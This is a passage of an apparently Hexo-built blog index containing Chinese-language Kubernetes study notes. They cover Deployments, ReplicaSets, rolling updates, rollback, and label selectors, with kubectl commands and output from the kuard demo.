Deployment 會建立 ReplicaSet<br>所以還是要會 ReplicaSet 怎麼用比較好</p>\n<h2 id=\"建立一個-Deployment\"><a href=\"#建立一個-Deployment\" class=\"headerlink\" title=\"建立一個 Deployment\"></a>建立一個 Deployment</h2><p>遇到apiVersion<br>error: unable to recognize “kuard-deployment.yml”: no matches for kind “Deployment” in version “extensions/v1beta1”<br>error: unable to recognize “kuard-deployment.yml”: no matches for kind “Deployment” in version “apps/v1beta1”<br>參考:<a href=\"https://stackoverflow.com/questions/58481850/no-matches-for-kind-deployment-in-version-extensions-v1beta1\" target=\"_blank\" rel=\"noopener\">kubernetes - no matches for kind “Deployment” in version “extensions/v1beta1” - Stack Overflow</a></p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">apps/v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Deployment</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\"><span class=\"attr\">  name:</span> <span class=\"string\">kuard-deployment</span></span><br><span class=\"line\"><span class=\"comment\">#   labels:</span></span><br><span class=\"line\"><span class=\"comment\">#     app: kuard</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  replicas:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">  selector:</span></span><br><span class=\"line\"><span class=\"attr\">    matchLabels:</span></span><br><span class=\"line\"><span class=\"attr\">      app:</span> <span class=\"string\">kuard</span></span><br><span class=\"line\"><span class=\"attr\">  template:</span></span><br><span class=\"line\"><span class=\"attr\">    metadata:</span></span><br><span class=\"line\"><span class=\"attr\">      labels:</span></span><br><span class=\"line\"><span class=\"attr\">        app:</span> <span class=\"string\">kuard</span></span><br><span class=\"line\"><span class=\"attr\">    spec:</span></span><br><span class=\"line\"><span class=\"attr\">      containers:</span></span><br><span class=\"line\"><span class=\"attr\">        - image:</span> <span class=\"string\">gcr.io/kuar-demo/kuard-amd64:blue</span></span><br><span class=\"line\"><span class=\"attr\">          name:</span> <span class=\"string\">kuard</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"https://gist.github.com/erikaulin/d4de231655a1a5011dae5ecc39a49956\" target=\"_blank\" rel=\"noopener\">Kubernetes kuard deployment</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看所有 Object List</span></span><br><span class=\"line\">kubectl get all </span><br><span class=\"line\"><span class=\"comment\"># NAME                                    READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># pod/kuard-deployment-6cd695495f-kt88w   1/1     Running   0          105s</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># NAME                  TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span></span><br><span class=\"line\"><span class=\"comment\"># service/bar-service   ClusterIP   10.96.108.167   &lt;none&gt;        5678/TCP   2d16h</span></span><br><span class=\"line\"><span class=\"comment\"># service/foo-service   ClusterIP   10.96.109.30    &lt;none&gt;        5678/TCP   2d16h</span></span><br><span class=\"line\"><span class=\"comment\"># service/kubernetes    ClusterIP   10.96.0.1       &lt;none&gt;        443/TCP    2d17h</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># NAME                               READY   UP-TO-DATE   AVAILABLE   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># deployment.apps/kuard-deployment   1/1     1            1           106s</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># NAME                                          DESIRED   CURRENT   READY   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># replicaset.apps/kuard-deployment-6cd695495f   1         1         1       106s</span></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get deployments kuard-deployment -o jsonpath --template &#123;.spc.selector.matchLabels&#125;</span><br><span class=\"line\"><span class=\"comment\"># &#123;\"app\":\"kuard\"&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get all --selector=<span class=\"string\">\"app=kuard\"</span></span><br><span class=\"line\"><span class=\"comment\"># NAME                                    READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># pod/kuard-deployment-6cd695495f-kt88w   1/1     Running   0          9m34s</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># NAME                                          DESIRED   CURRENT   READY   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># replicaset.apps/kuard-deployment-6cd695495f   1         1         1       9m34s</span></span><br><span class=\"line\">kubectl get replicasets --selector=app=kuard</span><br><span class=\"line\"><span class=\"comment\"># NAME                          DESIRED   CURRENT   READY   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-6cd695495f   1         1         1       79m</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改 deployment 的 replicas</span></span><br><span class=\"line\">kubectl scale deployments kuard-deployment --replicas=3</span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get replicasets --selector=app=kuard</span><br><span class=\"line\"><span class=\"comment\"># NAME                          DESIRED   CURRENT   READY   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-6cd695495f   3         3         3       82m</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 修改 replicaset = 1(這邊不是用 deployment)</span></span><br><span class=\"line\">kubectl scale replicaset kuard-deployment-6cd695495f --replicas=1 </span><br><span class=\"line\"></span><br><span class=\"line\">kubectl get replicasets --selector=app=kuard</span><br><span class=\"line\"><span class=\"comment\"># NAME                          DESIRED   CURRENT   READY   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-6cd695495f   3         3         3       82m</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 不會發生任何改變，下面等等會說</span></span><br></pre></td></tr></table></figure>\n<p>這邊說一下運作方式<br>Deployment 會管理 ReplicaSet，ReplicaSet 用來管理Pod。<br>所以要懂 ReplicaSet 是做什麼用的。</p>\n<p>上面對 ReplicasSet 做 scale 調整<br>為什麼不會改變，是因為<code>Deployment</code> 上層設定不一樣的值<br>Deployment 控制器會重新調整 replica 數量</p>\n<p>這種情況下，有一個方法改 ReplicaSet<br>對 Deployment 刪除(<code>--cascade=orphan</code>) &lt;– 舊版是 <code>--cascade=false</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 匯出設定檔出來</span></span><br><span class=\"line\">kubectl get deployments kuard-deployment -o yaml &gt; kuard-deployment.yaml</span><br><span class=\"line\"><span class=\"comment\"># 暫時不研究，但應該可以不用做</span></span><br><span class=\"line\"><span class=\"comment\">#kubectl replace -f kuard-deployment.yaml --save-config</span></span><br></pre></td></tr></table></figure>\n<p>可以看到 裡面有很多預設值</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">strategy:</span></span><br><span class=\"line\"><span class=\"attr\">  rollingUpdate:</span></span><br><span class=\"line\"><span class=\"attr\">    maxSurge:</span> <span class=\"number\">25</span><span class=\"string\">%</span></span><br><span class=\"line\"><span class=\"attr\">    maxUnavailable:</span> <span class=\"number\">25</span><span class=\"string\">%</span></span><br><span class=\"line\"><span class=\"attr\">  type:</span> <span class=\"string\">RollingUpdate</span></span><br></pre></td></tr></table></figure>\n<p>這邊跟書裡面提到不一樣<br>看來新版<code>maxSurge</code>和<code>maxUnavailable</code>都變成百分比</p>\n<h2 id=\"管理-Deployment\"><a href=\"#管理-Deployment\" class=\"headerlink\" title=\"管理 Deployment\"></a>管理 Deployment</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl describe deployments kuard-deployment</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Name:                   kuard-deployment</span><br><span class=\"line\">Namespace:              default</span><br><span class=\"line\">CreationTimestamp:      Sun, 14 Feb 2021 20:55:44 +0800</span><br><span class=\"line\">Labels:                 &lt;none&gt;</span><br><span class=\"line\">Annotations:            deployment.kubernetes.io/revision: 1</span><br><span class=\"line\">Selector:               app=kuard</span><br><span class=\"line\">Replicas:               1 desired | 1 updated | 1 total | 1 available | 0 unavailable</span><br><span class=\"line\">StrategyType:           RollingUpdate</span><br><span class=\"line\">MinReadySeconds:        0</span><br><span class=\"line\">RollingUpdateStrategy:  25% max unavailable, 25% max surge</span><br><span class=\"line\">Pod Template:</span><br><span class=\"line\">  Labels:  app=kuard</span><br><span class=\"line\">  Containers:</span><br><span class=\"line\">   kuard:</span><br><span class=\"line\">    Image:        gcr.io/kuar-demo/kuard-amd64:blue</span><br><span class=\"line\">    Port:         &lt;none&gt;</span><br><span class=\"line\">    Host Port:    &lt;none&gt;</span><br><span class=\"line\">    Environment:  &lt;none&gt;</span><br><span class=\"line\">    Mounts:       &lt;none&gt;</span><br><span class=\"line\">  Volumes:        &lt;none&gt;</span><br><span class=\"line\">Conditions:</span><br><span class=\"line\">  Type           Status  Reason</span><br><span class=\"line\">  ----           ------  ------</span><br><span class=\"line\">  Available      True    MinimumReplicasAvailable</span><br><span class=\"line\">  Progressing    True    NewReplicaSetAvailable</span><br><span class=\"line\">OldReplicaSets:  &lt;none&gt;</span><br><span class=\"line\">NewReplicaSet:   kuard-deployment-6cd695495f (1/1 replicas created)</span><br><span class=\"line\">Events:</span><br><span class=\"line\">  Type    Reason             Age   From                   Message</span><br><span class=\"line\">  ----    ------             ----  ----                   -------</span><br><span class=\"line\">  Normal  ScalingReplicaSet  16m   deployment-controller  Scaled down replica set kuard-deployment-6cd695495f to 1</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">OldReplicaSets:  &lt;none&gt;</span><br><span class=\"line\">NewReplicaSet:   kuard-deployment-6cd695495f (1/1 replicas created)</span><br></pre></td></tr></table></figure>\n<p>其中 <code>OldReplicaSets</code> 和 <code>NewReplicaSet</code> 是由 Deployment 管理狀態。rollout 中兩邊欄位值會有資料，rollout 完成後 OldReplicaSets 就會 none。</p>\n<h2 id=\"更改容器的映像檔\"><a href=\"#更改容器的映像檔\" class=\"headerlink\" title=\"更改容器的映像檔\"></a>更改容器的映像檔</h2><p>修改 deployment 設定裡面的 image tag 改成 green</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\"><span class=\"attr\">  containers:</span></span><br><span class=\"line\"><span class=\"attr\">    - image:</span> <span class=\"string\">gcr.io/kuar-demo/kuard-amd64:blue</span></span><br></pre></td></tr></table></figure>\n<p><code>kubectl apply -f kuard-deployment.yml</code><br>建議 replicaset 可以設定大一點<br>可以看到 OldReplicaSets ,NewReplicaSet 這兩個變化</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看更新狀態</span></span><br><span class=\"line\">kubectl rollout status deployments kuard-deployment</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 可以看到新舊 ReplicaSets 都存在，之後退版可能會用到</span></span><br><span class=\"line\">kubectl get replicasets -o wide </span><br><span class=\"line\"><span class=\"comment\"># NAME                          DESIRED   CURRENT   READY   AGE     CONTAINERS   IMAGES                               SELECTOR</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-5984cbd7dd   0         0         0       13m     kuard        gcr.io/kuar-demo/kuard-amd64:green   app=kuard,pod-template-hash=5984cbd7dd</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-6cd695495f   20        20        20      6h38m   kuard        gcr.io/kuar-demo/kuard-amd64:blue    app=kuard,pod-template-hash=6cd695495f</span></span><br></pre></td></tr></table></figure>\n<p><del>TODO: 這邊 deployment 程式後，不知道 Service LB 進去會等全部上完好，才會連到新的POD，還是會綜合?</del><br>建立 4 個 ReplicaSets 去跑<br><code>kubectl get endpoints kuard-service --watch -o yaml</code><br>查看變化，看來<strong>舊新</strong>在跑的時候會同時 LB 舊新(綜合)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 暫停部屬</span></span><br><span class=\"line\">kubectl rollout pause deployments kuard-deployment</span><br><span class=\"line\"><span class=\"comment\"># 繼續部屬</span></span><br><span class=\"line\">kubectl rollout resume deployments kuard-deployment</span><br></pre></td></tr></table></figure>\n<h2 id=\"查詢歷史狀態\"><a href=\"#查詢歷史狀態\" class=\"headerlink\" title=\"查詢歷史狀態\"></a>查詢歷史狀態</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 查看 Deployment 的歷史紀錄</span></span><br><span class=\"line\">kubectl rollout <span class=\"built_in\">history</span> deployment kuard-deployment</span><br><span class=\"line\"><span class=\"comment\"># deployment.apps/kuard-deployment </span></span><br><span class=\"line\"><span class=\"comment\"># REVISION  CHANGE-CAUSE</span></span><br><span class=\"line\"><span class=\"comment\"># 7         &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 8         &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 9         &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 12        &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 13        &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># 查看 Deployment 詳細資訊</span></span><br><span class=\"line\">kubectl rollout <span class=\"built_in\">history</span> deployment kuard-deployment --revision=12</span><br><span class=\"line\"><span class=\"comment\"># deployment.apps/kuard-deployment with revision #12</span></span><br><span class=\"line\"><span class=\"comment\"># Pod Template:</span></span><br><span class=\"line\"><span class=\"comment\">#   Labels:       app=kuard</span></span><br><span class=\"line\"><span class=\"comment\">#         pod-template-hash=bd94b5dbb</span></span><br><span class=\"line\"><span class=\"comment\">#   Containers:</span></span><br><span class=\"line\"><span class=\"comment\">#    kuard:</span></span><br><span class=\"line\"><span class=\"comment\">#     Image:      gcr.io/kuar-demo/kuard-amd64:blue</span></span><br><span class=\"line\"><span class=\"comment\">#     Port:       8080/TCP</span></span><br><span class=\"line\"><span class=\"comment\">#     Host Port:  0/TCP</span></span><br><span class=\"line\"><span class=\"comment\">#     Environment:        &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#     Mounts:     &lt;none&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#   Volumes:      &lt;none&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"退回版本\"><a href=\"#退回版本\" class=\"headerlink\" title=\"退回版本\"></a>退回版本</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 退回前一個版本</span></span><br><span class=\"line\">kubectl rollout undo deployments kuard-deployment</span><br><span class=\"line\"><span class=\"comment\"># deployment.apps/kuard-deployment rolled back</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看 replica 數</span></span><br><span class=\"line\">kubectl get replicasets -o wide</span><br><span class=\"line\"><span class=\"comment\"># NAME                          DESIRED   CURRENT   READY   AGE   CONTAINERS   IMAGES                               SELECTOR</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-5984cbd7dd   0         0         0       22h   kuard        gcr.io/kuar-demo/kuard-amd64:green   app=kuard,pod-template-hash=5984cbd7dd</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-697c6c85     0         0         0       21h   kuard        gcr.io/kuar-demo/kuard-amd64:green   app=kuard,pod-template-hash=697c6c85</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-6cd695495f   0         0         0       29h   kuard        gcr.io/kuar-demo/kuard-amd64:blue    app=kuard,pod-template-hash=6cd695495f</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-bd94b5dbb    4         4         4       21h   kuard        gcr.io/kuar-demo/kuard-amd64:blue    app=kuard,pod-template-hash=bd94b5dbb</span></span><br><span class=\"line\"><span class=\"comment\"># kuard-deployment-f948c99d9    0         0         0       21h   kuard        gcr.io/kuar-demo/kuard-amd64:1       app=kuard,pod-template-hash=f948c99d9</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 退回某一版 --to-revision</span></span><br><span class=\"line\">kubectl rollout undo deployments kuard-deployment --to-revision=11</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 指令上一個版本 =&gt; --to-revision=0</span></span><br><span class=\"line\">kubectl rollout <span class=\"built_in\">history</span> deployment kuard-deployment --to-revision=0</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>清理策略</p>\n<p>你可以在 Deployment 中設置 .spec.revisionHistoryLimit 字段以指定保留此 Deployment 的多少個舊有 ReplicaSet。其餘的 ReplicaSet 將在後台被&gt; 垃圾回收。 默認情況下，此值為 10。</p>\n<p>說明： 顯式將此字段設置為 0 將導致 Deployment 的所有歷史記錄被清空，因此 Deployment 將無法回滾。<br>滾動更新 Deployment</p>\n</blockquote>\n<h2 id=\"Deployment-策略\"><a href=\"#Deployment-策略\" class=\"headerlink\" title=\"Deployment 策略\"></a>Deployment 策略</h2><ol>\n<li>Recreate 策略</li>\n</ol>\n<p>會把現有的 ReplicaSet 的 Image 換掉，所有 Pod 都會機高新建置。</p>\n<ol start=\"2\">\n<li>RollingUpdate</li>\n</ol>\n<p>滾動方式不停機情況下更新</p>\n<h2 id=\"滾動更新設定\"><a href=\"#滾動更新設定\" class=\"headerlink\" title=\"滾動更新設定\"></a>滾動更新設定</h2><blockquote>\n<p>Deployment 會在 .spec.strategy.type==RollingUpdate時，採取 滾動更新的方式更新 Pods。你可以指定 maxUnavailable 和 maxSurge 來控制滾動更新 過程。<br>最大不可用</p>\n<p>.spec.strategy.rollingUpdate.maxUnavailable 是一個可選字段，用來指定 更新過程中不可用的 Pod 的個數上限。該值可以是絕對數字（例如，5），也可以是 所需 Pods 的百分比（例如，10%）。百分比值會轉換成絕對數並去除小數部分。 如果 .spec.strategy.rollingUpdate.maxSurge 為 0，則此值不能為 0。 默認值為 25%。</p>\n<p>例如，當此值設置為 30% 時，滾動更新開始時會立即將舊 ReplicaSet 縮容到期望 Pod 個數的70%。 新 Pod 準備就緒後，可以繼續縮容舊有的 ReplicaSet，然後對新的 ReplicaSet 擴容，確保在更新期間 可用的 Pods 總數在任何時候都至少為所需的 Pod 個數的 70%。<br>最大峰值</p>\n<p>.spec.strategy.rollingUpdate.maxSurge 是一個可選字段，用來指定可以創建的超出 期望 Pod 個數的 Pod 數量。此值可以是絕對數（例如，5）或所需 Pods 的百分比（例如，10%）。 如果 MaxUnavailable 為 0，則此值不能為 0。百分比值會通過向上取整轉換為絕對數。 此字段的默認值為 25%。</p>\n<p>例如，當此值為 30% 時，啟動滾動更新後，會立即對新的 ReplicaSet 擴容，同時保證新舊 Pod 的總數不超過所需 Pod 總數的 130%。一旦舊 Pods 被殺死，新的 ReplicaSet 可以進一步擴容， 同時確保更新期間的任何時候運行中的 Pods 總數最多為所需 Pods 總數的 130%。<br>進度期限秒數</p>\n<p>.spec.progressDeadlineSeconds 是一個可選字段，用於指定系統在報告 Deployment 進展失敗 之前等待 Deployment 取得進展的秒數。 這類報告會在資源狀態中體現為 Type=Progressing、Status=False、 Reason=ProgressDeadlineExceeded。Deployment 控制器將持續重試 Deployment。 將來，一旦實現了自動回滾，Deployment 控制器將在探測到這樣的條件時立即回滾 Deployment。</p>\n<p>如果指定，則此字段值需要大於 .spec.minReadySeconds 取值。<br>最短就緒時間<br>.spec.minReadySeconds 是一個可選字段，用於指定新創建的 Pod 在沒有任意容器崩潰情況下的最小就緒時間， 只有超出這個時間 Pod 才被視為可用。默認值為 0（Pod 在準備就緒後立即將被視為可用）。 要瞭解何時 Pod 被視為就緒，可參考容器探針。</p>\n</blockquote>\n<p>我看到最詳細簡單說明</p>\n<blockquote>\n<p>   minReadySeconds:<br>       容器內應用程式的啟動時間，Kubernetes 會等待設定的時間後才繼續進行升級流程<br>       如果沒有此欄位的話，Kubernetes 會假設該容器一開完後即可進行服務<br>       若未設定此欄位，在某些極端情況下可能會造成服務無法正常運作(新誕生的 pod 尚未進入可服務階段)<br>   maxSurge:<br>       升級過程中最多可以比原先設定所多出的 pod 數量<br>       此欄位可以為固定值或是比例(%)<br>       ex. maxSurge: 1、replicas: 5，代表 Kubernetes 會先開好 1 個新 pod 後才刪掉一個舊的 pod，整個升級過程中最多會有 5+1 個 pod<br>   maxUnavailable:<br>       最多可以有幾個 pod 處在無法服務的狀態<br>       當 maxSurge 不為零時，此欄位亦不可為零<br>       ex. maxUnavailable: 1，代表 Kubernetes 整個升級過程中最多會有 1 個 pod 處在無法服務的狀態</p>\n</blockquote>\n<p>參考:<a href=\"https://tachingchen.com/tw/blog/kubernetes-rolling-update-with-deployment/\" target=\"_blank\" rel=\"noopener\">透過 Kubernetes Deployments 實現滾動升級 | Kubernetes</a></p>\n<p><a href=\"https://godleon.github.io/blog/Kubernetes/k8s-Deployment-Overview/\" target=\"_blank\" rel=\"noopener\">[Kubernetes] Deployment Overview | 小信豬的原始部落</a></p>\n<h2 id=\"刪除-Deployment\"><a href=\"#刪除-Deployment\" class=\"headerlink\" title=\"刪除 Deployment\"></a>刪除 Deployment</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl delete deployments kuard-deployment</span><br></pre></td></tr></table></figure>\n<p>所有的 Pod ,ReplicaSet 都會一起刪除</p>\n<h2 id=\"感想\"><a href=\"#感想\" class=\"headerlink\" title=\"感想\"></a>感想</h2><p>上面我測試 Service 更做更新的時候<br>不是會有舊新同時運行狀況<br>後面書上有提到前端到後端，前端要做好版本前後相容問題<br>這樣在切換上才不會發生問題</p>\n","categories":["Kubernetes"],"tags":["kubernetes","deployment"]},{"title":"Kubernetes 的 Label 和 Annotation 小記","url":"/blog/2021/02/02/Kubernetes-%E7%9A%84-Label-%E5%92%8C-Annotation-%E5%B0%8F%E8%A8%98/","content":"<p>Kubernetes 的 Label 和 Annotation 小記</p>\n<a id=\"more\"></a>\n<h2 id=\"Label\"><a href=\"#Label\" class=\"headerlink\" title=\"Label\"></a>Label</h2><h3 id=\"實作\"><a href=\"#實作\" class=\"headerlink\" title=\"實作\"></a>實作</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl run alpaca-prod \\</span><br><span class=\"line\">--image=gcr.io/kuar-demo/kuard-amd64:blue \\</span><br><span class=\"line\">--replicas=2 \\ <span class=\"comment\"># 這個已經廢棄</span></span><br><span class=\"line\">--labels=<span class=\"string\">\"ver=1,app=alpaca,env=prod\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl run alpaca-test \\</span><br><span class=\"line\">--image=gcr.io/kuar-demo/kuard-amd64:green \\</span><br><span class=\"line\">--replicas=1 \\ <span class=\"comment\"># 這個已經廢棄</span></span><br><span class=\"line\">--labels=<span class=\"string\">\"ver=2,app=alpaca,env=test\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl run bandicoot-prod \\</span><br><span class=\"line\">--image=gcr.io/kuar-demo/kuard-amd64:green \\</span><br><span class=\"line\">--replicas=2 \\ <span class=\"comment\"># 這個已經廢棄</span></span><br><span class=\"line\">--labels=<span class=\"string\">\"ver=2,app=bandicoot,env=prod\"</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl run bandicoot-staging \\</span><br><span class=\"line\">--image=gcr.io/kuar-demo/kuard-amd64:green \\</span><br><span class=\"line\">--replicas=1 \\</span><br><span class=\"line\">--labels=<span class=\"string\">\"ver=2,app=bandicoot,env=prod\"</span></span><br></pre></td></tr></table></figure>\n<p><code>Flag --replicas has been deprecated, has no effect and will be removed in the future.</code></p>\n<blockquote>\n<p>在K8S v1.18.0 以後，–replicas已棄用 ,推薦用 deployment 創建 pods<br><a href=\"https://www.cnblogs.com/cnbai/p/12911521.html\" target=\"_blank\" rel=\"noopener\">解决k8s 1.18.0版本 replicas 被弃用问题 - 菜鸟bai - 博客园</a></p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"> kubectl get pods --show-labels </span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE     LABELS</span></span><br><span class=\"line\"><span class=\"comment\"># alaca-prod          1/1     Running   0          2m46s   app=alpaca,env=prod,ver=1</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test         1/1     Running   0          2m11s   app=alpaca,env=test,ver=2</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          2m4s    app=bandicoot,env=prod,ver=2</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          117s    app=bandicoot,env=prod,ver=2</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>Remove all the generators from kubectl run. It will now only create pods.<br><a href=\"https://stackoverflow.com/a/62036673\" target=\"_blank\" rel=\"noopener\">minikube - How to start a pod in command line without deployment in kubernetes? - Stack Overflow</a></p>\n</blockquote>\n<p>這邊我書上都寫 deployments 想說怎麼跟我電腦跑的結果不一樣</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl label pods alpaca-test <span class=\"string\">\"canary=true\"</span>                                                                ✔  22  22:27:42 </span><br><span class=\"line\"><span class=\"comment\"># pod/alpaca-test labeled</span></span><br><span class=\"line\">kubectl get pods alpaca-test -L canary                                                                      ✔  23  22:28:03 </span><br><span class=\"line\"><span class=\"comment\"># NAME          READY   STATUS    RESTARTS   AGE   CANARY</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test   1/1     Running   0          12m   true</span></span><br><span class=\"line\">kubectl label podsalpaca-test <span class=\"string\">\"canary-\"</span></span><br><span class=\"line\"><span class=\"comment\"># pod/alpaca-test labeled</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Label-選擇器\"><a href=\"#Label-選擇器\" class=\"headerlink\" title=\"Label 選擇器\"></a>Label 選擇器</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get pods --show-labels</span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE   LABELS</span></span><br><span class=\"line\"><span class=\"comment\"># alaca-prod          1/1     Running   0          16m   app=alpaca,env=prod,ver=1</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test         1/1     Running   0          15m   app=alpaca,env=test,ver=2</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          15m   app=bandicoot,env=prod,ver=2</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          15m   app=bandicoot,env=prod,ver=2</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get pods --selector=<span class=\"string\">\"ver=2\"</span></span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test         1/1     Running   0          22m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          22m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          22m</span></span><br><span class=\"line\">kubectl get pods --selector=<span class=\"string\">\"app=bandicoot,ver=2\"</span></span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          23m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          23m</span></span><br><span class=\"line\">kubectl get pods --selector=<span class=\"string\">\"app in (alpaca,bandicoot)\"</span></span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-prod         1/1     Running   0          4m35s</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test         1/1     Running   0          26m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          26m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          26m</span></span><br><span class=\"line\">kubectl get pods --selector=<span class=\"string\">\"canary\"</span></span><br><span class=\"line\"><span class=\"comment\"># No resources found in default namespace.</span></span><br><span class=\"line\">kubectl get pods --selector=<span class=\"string\">'!canary'</span></span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-prod         1/1     Running   0          7m19s</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test         1/1     Running   0          29m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          29m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          29m</span></span><br><span class=\"line\">kubectl get pods -l <span class=\"string\">'ver=2,!canary'</span></span><br><span class=\"line\"><span class=\"comment\"># NAME                READY   STATUS    RESTARTS   AGE</span></span><br><span class=\"line\"><span class=\"comment\"># alpaca-test         1/1     Running   0          30m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-prod      1/1     Running   0          30m</span></span><br><span class=\"line\"><span class=\"comment\"># bandicoot-staging   1/1     Running   0          30m</span></span><br></pre></td></tr></table></figure>\n<h3 